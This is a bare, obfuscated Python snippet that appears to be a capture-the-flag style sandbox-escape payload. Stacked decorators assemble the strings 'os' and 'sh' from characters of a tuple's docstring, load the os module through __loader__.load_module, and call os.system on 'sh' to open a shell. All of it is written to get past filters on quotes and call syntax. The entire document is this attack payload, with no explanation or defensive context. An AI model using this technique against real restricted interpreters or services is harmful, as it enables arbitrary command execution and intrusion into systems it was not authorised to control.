@().__doc__[34].__add__
@(lambda _: ().__doc__[19])
def os():
    ...

@().__doc__[19].__add__
@(lambda _: ().__doc__[56])
def sh():
    ...

@(lambda x: x.system)
@__loader__.load_module
@(lambda _: os)
def a():
    ...

@a
@(lambda _: sh)
def b():
    ...